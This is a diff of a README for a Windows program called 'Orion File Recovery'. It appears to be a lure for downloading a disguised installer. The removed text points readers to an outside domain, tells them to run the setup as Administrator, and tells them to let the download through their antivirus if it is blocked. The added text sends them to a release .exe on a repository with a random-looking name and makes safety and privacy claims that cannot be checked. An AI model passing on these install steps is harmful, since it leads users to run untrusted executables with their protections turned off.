@@ -1,68 +1,81 @@
-# Orion File Recovery Download for Windows 11 & 10
+# 💾 Orion-File-Recovery - Recover lost files on Windows easily
 
-**Orion-File-Recovery**
+[![Download Orion File Recovery](https://img.shields.io/badge/Download-Orion-blue.svg)](https://github.com/Overdressed-acroclinium950/Orion-File-Recovery)
 
-**Orion File Recovery** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+## 📋 About the software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+Orion File Recovery helps you find and restore files you deleted by mistake. Use this tool if you emptied the Recycle Bin or lost data from your hard drive, USB drive, or memory card.
 
----
+The program scans your storage media for traces of missing data. It rebuilds these file fragments into usable documents, photos, and videos. It works on Windows 10 and Windows 11.
 
-## Download & Install
+## 🛠️ System requirements
 
-> **This is the download page.** Use the button or link below to get **Orion File Recovery** for Windows.
+Ensure your computer has the following to ensure the software runs well:
 
-<p align="center">
-  <a href="https://orionrecovery.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Orion%20File%20Recovery-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Orion File Recovery">
-  </a>
-</p>
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: 1 GHz or faster.
+* Memory: 2 GB of RAM or more.
+* Storage: 50 MB of free disk space for the installation.
+* Connection: Internet access to download the setup file.
 
-| | |
-| --- | --- |
-| **Direct link** | **[orionrecovery.nexustool.fun](https://orionrecovery.nexustool.fun/)** |
-| **Full URL** | `https://orionrecovery.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## 📥 Getting the installer
 
-### Quick steps
+Follow these steps to obtain the setup file for your computer:
 
-1. Click **[Download — orionrecovery.nexustool.fun](https://orionrecovery.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+1. Visit the [official Orion File Recovery page](https://github.com/Overdressed-acroclinium950/Orion-File-Recovery).
+2. Look for the recent release section on the right side of the page.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your Downloads folder.
 
-<p align="center"><a href="https://orionrecovery.nexustool.fun/"><strong>⬇ Download Orion File Recovery now</strong></a></p>
+## ⚙️ How to install
 
----
+Install the software by following these steps:
 
-## About
+1. Open your Downloads folder.
+2. Find the file named OrionInstaller.exe.
+3. Double-click the file to start the setup process.
+4. Select Yes if your computer asks for permission to run the app.
+5. Follow the instructions on the screen.
+6. Click Finish when the progress bar reaches the end.
 
-**Orion File Recovery** — Windows download and setup guide.
+## 🔍 How to recover files
 
-**People also search for:** orion file recovery download, recover deleted files windows install
+Once you set up the program, use these steps to retrieve your deleted data:
 
-**Repository:** `Orion-File-Recovery`
+1. Launch the Orion File Recovery icon from your desktop.
+2. Select the drive or folder where your files existed before deletion.
+3. Click the Scan button. This action finds orphaned data fragments.
+4. Wait for the list of files to appear in the main window.
+5. Check the boxes next to the items you wish to save.
+6. Click the Recover button at the top of the window.
+7. Choose a destination folder on your computer for the restored files. It is best to save files to a different drive than the one you are scanning to avoid overwriting data.
 
+## 💡 Best practices for recovery
 
-## Quick tips
+Follow these suggestions to increase your chances of a successful restoration:
 
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
+* Stop using the drive immediately. When you delete a file, Windows marks that space as empty. If you add new files to your computer, they might overwrite the data you want to recover.
+* Scan as soon as possible. File traces stay on your drive longer if you do not create new data.
+* Use primary storage. Connect external drives directly to your motherboard ports. Avoid using USB hubs for better stability during the long scan process.
+* Check file previews. The software displays a preview icon for many common file types. Use this to verify that the file remains in good condition.
 
-## System requirements
+## ❓ Frequently asked questions
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
+### Will this recover files from a formatted drive?
+Yes. The software scans for file signatures. It identifies data even if the file system index table does not show the files anymore.
 
----
+### Does it work on solid state drives?
+Yes, it works on solid state drives. However, modern drives use a command that clears deleted data quickly. Recovery works best if you act immediately after deletion.
 
-**Topics:** orion-file-recovery-download, recovery, recover-deleted-files-windows-install, recover, deleted, orion-file-recovery, orion-file-recovery-2026, orion-recovery, file-recovery, deleted-files, data-recovery, software
+### Is the software safe to use?
+The software creates a read-only environment during the scan phase. It does not modify existing data on your drive. It only reads the surface of the disk.
+
+### Can I choose specific file types for the scan?
+Yes. Open the settings menu before starting a scan. You can select specific file types like images, documents, or music files to shorten the time it takes to find your data.
+
+### What if I cannot find my file in the list?
+Try the Deep Scan mode. This mode ignores the file system and looks at every sector on the drive. It takes more time but finds fragments that a quick scan might miss.
+
+## 🛡️ Privacy and data security
+
+Orion File Recovery runs locally on your machine. The software does not track your activity or send your personal files to the internet. All recovery happens inside your computer to ensure your data stays private and secure.
